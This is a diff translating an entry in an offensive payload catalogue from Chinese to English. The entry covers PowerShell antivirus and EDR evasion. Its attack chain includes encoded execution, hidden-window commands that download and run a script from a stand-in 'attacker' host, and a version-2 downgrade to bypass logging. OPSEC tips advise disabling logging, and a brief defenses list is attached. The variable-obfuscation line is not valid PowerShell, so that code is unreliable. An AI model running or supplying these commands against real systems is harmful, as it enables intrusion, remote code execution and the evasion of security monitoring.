@@ -1,72 +1,72 @@
-# 免杀与规避
+# AV Evasion and Bypass
 
-_14 条 intranet payload_
+_14 intranet payloads_
 
-### PowerShell免杀  `evasion-powershell`
-_PowerShell脚本免杀技术_
-子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`
+### PowerShell AV Evasion  `evasion-powershell`
+_PowerShell script AV evasion techniques_
+Subcategory: **PowerShell** · tags: `powershell` `evasion` `obfuscation`
 
-**前置条件：**
-- 目标机器访问权限
-- Windows系统
+**Prerequisites:**
+- Access to the target machine
+- Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**编码执行**
-> Base64编码执行
+**Encoded execution**
+> Base64-encoded execution
 _platform: windows_
 ```
 powershell -enc BASE64_ENCODED_COMMAND
 ```
-**语法解析：**
-- `-enc` — Base64编码命令 _parameter_
+**Syntax breakdown:**
+- `-enc` — Base64-encoded command _parameter_
 
-**远程加载**
-> 远程加载脚本
+**Remote loading**
+> Remotely load a script
 _platform: windows_
 ```
 IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
 ```
 
-**混淆变量名**
-> 变量名混淆
+**Obfuscated variable names**
+> Variable name obfuscation
 _platform: windows_
 ```
 1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
 ```
 
-**无文件执行**
-> 隐藏窗口无配置文件执行
+**Fileless execution**
+> Hidden window, no-profile execution
 _platform: windows_
 ```
 powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
 ```
-**语法解析：**
-- `-w hidden` — 隐藏窗口 _parameter_
-- `-nop` — 无配置文件 _parameter_
+**Syntax breakdown:**
+- `-w hidden` — hide the window _parameter_
+- `-nop` — no profile _parameter_
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**降级执行**
-> 使用PowerShell v2绕过日志
+**Downgrade execution**
+> Use PowerShell v2 to bypass logging
 ```
 powershell -version 2 -c "command"
 ```
 
-**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。
+**Analysis:** PowerShell AV evasion can bypass antivirus detection to execute malicious scripts.
 
-**OPSEC 提示：**
-- PowerShell日志可能记录命令
-- 考虑禁用日志
-- 使用混淆技术
+**OPSEC tips:**
+- PowerShell logging may record commands
+- Consider disabling logging
+- Use obfuscation techniques
 
-**概述：** PowerShell是Windows强大的脚本环境，攻击者可以使用各种技术绕过检测。
+**Overview:** PowerShell is a powerful Windows scripting environment, and attackers can use various techniques to bypass detection.
 
-**漏洞原理：** PowerShell的灵活性和强大功能使其成为攻击者的首选工具。
+**Vulnerability principle:** PowerShell's flexibility and power make it a favored tool for attackers.
 
-**利用方法：** 利用流程：1) 获取目标机器访问权限；2) 使用免杀技术；3) 执行恶意脚本；4) 完成攻击。
+**Exploitation method:** Exploitation flow: 1) gain access to the target machine; 2) apply AV evasion techniques; 3) execute the malicious script; 4) complete the attack.
 
-**防御措施：** 防御措施：1) 启用PowerShell日志；2) 使用约束语言模式；3) 监控异常PowerShell活动。
+**Defense measures:** Defense measures: 1) enable PowerShell logging; 2) use Constrained Language Mode; 3) monitor for anomalous PowerShell activity.
 
 ---
 
